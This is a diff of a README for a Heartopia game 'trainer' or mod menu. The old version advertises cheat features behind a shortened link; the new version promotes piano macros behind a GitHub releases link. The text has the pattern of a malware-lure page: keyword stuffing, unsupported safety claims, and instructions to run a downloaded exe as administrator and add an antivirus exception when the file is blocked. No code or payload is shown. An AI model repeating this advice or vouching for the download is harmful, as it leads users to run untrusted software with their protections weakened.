@@ -1,89 +1,197 @@
-# ⭐️ Heartopia Trainer 2026 - Auto Farm, Speed, Resources & More [FREE]
+# 🎹 heartopia-mod-menu - Unlock Hidden Piano Features & Macros
 
-![Heartopia](https://img.shields.io/badge/Game-Heartopia-blue?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-2026-brightgreen?style=for-the-badge)
-![Version](https://img.shields.io/badge/Version-2026-blue?style=for-the-badge)
-![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-orange?style=for-the-badge)
+## 🚀 Quick Download
 
-**Best Heartopia Trainer 2026** — a feature-rich trainer for Heartopia on Windows 10 and Windows 11. Designed to make exploration, resource gathering, farming and progression more convenient with a selection of gameplay-enhancing features.
+[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
 
-Perfect for players who want to collect resources faster, simplify repetitive activities and enjoy the beautiful world of Heartopia with additional customization options.
-
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Gold?logo=download&style=for-the-badge&labelColor=black)](https://share.google/2zNHJ4SC9e54Q7Ham)
-
-### ✨ Main Features
-
-### 🌾 Farming & Resources
-- **Auto Farm** — Automate repetitive farming activities
-- **Auto Collect** — Automatically collect nearby resources and items
-- **Resource Multiplier** — Increase resource gathering efficiency
-- **Fast Gathering** — Reduce the time required for repetitive collection
-- **Unlimited Resources** — Additional resource options where supported
-
-### ⚡ Movement & Gameplay
-- **Speed Boost** — Move around the world faster
-- **Jump Enhancement** — Improved jumping and movement options
-- **No Fall Damage** — Additional protection from falls
-- **Stamina Options** — Customize stamina-related gameplay
-- **Gameplay Speed** — Adjust selected gameplay parameters
-
-### 🛠️ Additional Features
-- **Easy Crafting** — Simplify crafting and resource management
-- **Quest Assistance** — Make repetitive quest activities easier
-- **Inventory Options** — Additional inventory customization
-- **Character Customization**
-- **Clean & Modern Menu** — Easy-to-use interface
-- **Config Support** — Save and load preferred settings
-
-### 📊 Before / After Using Heartopia Trainer
-
-| Feature | Without Trainer | With Heartopia Trainer |
-|---|---|---|
-| Resource Gathering | Manual | Faster & easier |
-| Farming | Repetitive | Automated |
-| Exploration | Normal | Faster |
-| Crafting | Standard | More convenient |
-| Progression | Normal pace | More efficient |
+Visit this link to download the application.
 
 ---
 
-### 🛠️ How to Use
+## 📋 What Is Heartopia Mod Menu?
 
-1. Download the Heartopia Trainer for Windows.
-2. Extract the downloaded archive.
-3. Launch Heartopia.
-4. Start the trainer.
-5. Select the available features.
-6. Configure the options according to your preferences.
+Heartopia Mod Menu is a powerful trainer tool designed specifically for Windows 11 and Windows 10 users who play Heartopia. This mod menu enhances your gaming experience by unlocking advanced piano macros and automation scripts that make gameplay smoother, faster, and more enjoyable.
 
-### ⚠️ Safety Recommendations
-
-- Download software only from sources you trust.
-- Keep your Windows security software enabled.
-- Check files before running them.
-- Avoid using third-party tools in online or competitive environments if they violate the game's rules.
-- Keep the trainer updated when Heartopia receives a major game update.
+Whether you are a casual player looking to simplify repetitive tasks or a dedicated enthusiast wanting to push the limits of what is possible in Heartopia, this trainer gives you the tools you need without requiring any technical knowledge.
 
 ---
 
-### 💡 Pro Tips
+## ✨ Key Features
 
-- Use resource-related features when working on large crafting projects.
-- Combine Auto Farm and Auto Collect for repetitive gathering.
-- Use movement options when exploring larger areas.
-- Save separate configurations for farming and exploration.
+### 🎯 Piano Macro Automation
+
+The heart of this mod menu is its piano macro system. You can record, save, and replay complex piano sequences with a single keystroke. This is perfect for mastering difficult songs or creating impressive performances effortlessly.
+
+### ⚡ Script Execution
+
+Run custom scripts that automate routine actions within Heartopia. The script engine is designed to be user-friendly, so even if you have never written a script before, you can use the built-in presets to get started immediately.
+
+### 🖥️ Windows 11 & 10 Optimized
+
+This trainer is built specifically for modern Windows operating systems. It runs smoothly on both Windows 11 and Windows 10, with no compatibility issues or performance hiccups.
+
+### 🔒 Safe and Lightweight
+
+The application is lightweight, taking up minimal system resources. It does not interfere with your game files or require any modifications to your Heartopia installation.
 
 ---
 
-### 📥 Download
+## 📥 Installation Guide
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Gold?logo=download&style=for-the-badge&labelColor=black)](https://share.google/2zNHJ4SC9e54Q7Ham)
+Follow these simple steps to get Heartopia Mod Menu running on your PC.
+
+### Step 1: Download the Application
+
+Click the download button below or visit the official releases page:
+
+[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
+
+Visit this link to download the application.
+
+### Step 2: Locate the Downloaded File
+
+Once the download is complete, open your Downloads folder (or the folder where your browser saves downloaded files). You will see a file named something like `heartopia-mod-menu.zip` or `heartopia-trainer.exe`.
+
+### Step 3: Extract or Run
+
+If you downloaded a ZIP file, right-click on it and select "Extract All." Choose a destination folder and click "Extract." Then open the extracted folder and double-click the application file inside.
+
+If you downloaded an EXE file, simply double-click it to run the installer or the application directly.
+
+### Step 4: Launch Heartopia Mod Menu
+
+After extraction or installation, double-click the Heartopia Mod Menu icon to launch the trainer. A small window will appear on your screen.
+
+### Step 5: Start Heartopia
+
+Now launch Heartopia normally. The mod menu will automatically detect the game and connect to it. You are ready to use all the features!
 
 ---
 
-**Heartopia Trainer 2026**  
-Auto Farm • Resources • Speed Boost • Auto Collect • Gameplay Enhancements
+## 🛠️ Setup and Configuration
 
-### Tags:
+### First-Time Setup
 
-`heartopia trainer` `heartopia cheat` `heartopia trainer 2026` `heartopia hack` `heartopia auto farm` `heartopia speed` `heartopia resources` `heartopia auto collect` `heartopia farming` `heartopia windows 11` `heartopia windows 10` `heartopia gameplay trainer` `heartopia mod` `best heartopia trainer`
+When you first open Heartopia Mod Menu, you will see a simple interface with several tabs. The main tabs are:
+
+- **Macros** – Where you can record and manage piano macros
+- **Scripts** – Where you can load and run automation scripts
+- **Settings** – Where you can adjust trainer behavior
+
+### Recording a Piano Macro
+
+1. Click the "Macros" tab.
+2. Click the "Record" button.
+3. Play the piano sequence in Heartopia that you want to capture.
+4. Click "Stop" when you are done.
+5. Give your macro a name and save it.
+
+### Playing a Macro
+
+1. Go to the "Macros" tab.
+2. Select the macro you want to use.
+3. Click "Play" or assign a hotkey.
+4. The macro will repeat the exact sequence you recorded.
+
+### Using Preset Scripts
+
+The trainer comes with several preset scripts that automate common tasks. To run one:
+
+1. Go to the "Scripts" tab.
+2. Browse the list of available scripts.
+3. Select one and click "Run."
+4. Watch as the script performs the actions automatically.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is Heartopia Mod Menu free?
+
+Yes, this trainer is completely free to download and use. There are no hidden fees or premium tiers.
+
+### Will this work with the latest version of Heartopia?
+
+The trainer is regularly updated to stay compatible with the latest Heartopia versions. Always download the newest release from the official page.
+
+### Do I need to install any additional software?
+
+No. Heartopia Mod Menu is self-contained. It does not require Python, Java, or any other runtime environment.
+
+### Is my account at risk?
+
+The trainer operates in memory only and does not modify game files. However, always use mods responsibly and check Heartopia's terms of service.
+
+### Can I use this on Windows 11?
+
+Absolutely. The trainer is fully optimized for Windows 11 and Windows 10.
+
+---
+
+## 🧩 Troubleshooting Tips
+
+### Application Won't Start
+
+- Make sure you have extracted the ZIP file completely.
+- Right-click the application and select "Run as administrator."
+- Check that your antivirus is not blocking the file. If it is, add an exception.
+
+### Macros Not Working
+
+- Ensure Heartopia is running before you try to play a macro.
+- Re-record the macro and make sure you press the correct keys.
+- Restart both Heartopia and the trainer.
+
+### Trainer Not Detecting Game
+
+- Close and reopen the trainer after launching Heartopia.
+- Update to the latest version of the trainer.
+- Restart your computer and try again.
+
+---
+
+## 📈 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** 1 GHz or faster
+- **RAM:** 2 GB minimum
+- **Storage:** 50 MB free space
+- **Display:** 1024 x 768 resolution or higher
+
+These are minimal requirements. The trainer runs on almost any modern PC.
+
+---
+
+## 🔄 Keeping the Trainer Updated
+
+New versions of Heartopia Mod Menu are released regularly. To stay up to date:
+
+1. Visit the releases page periodically.
+2. Download the latest version.
+3. Replace your old files with the new ones.
+
+You can bookmark the releases page for quick access:
+
+[![Check Latest Releases](https://img.shields.io/badge/Check-Latest_Releases-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
+
+---
+
+## 💬 Community and Support
+
+If you have questions, suggestions, or encounter issues, feel free to open an issue on the GitHub repository. The community is friendly and helpful, and the developer actively responds to feedback.
+
+---
+
+## 📜 License
+
+This project is distributed for personal use. Redistribution or commercial use is not permitted without explicit permission from the author.
+
+---
+
+## 🎉 Final Thoughts
+
+Heartopia Mod Menu is the ultimate companion for anyone who plays Heartopia on Windows. With its intuitive interface, powerful macro recording, and script automation, you can take your gameplay to the next level. Download it today and experience Heartopia like never before!
+
+---
+
+Keywords: heartopia, heartopia-macro, heartopia-piano, heartopia-script
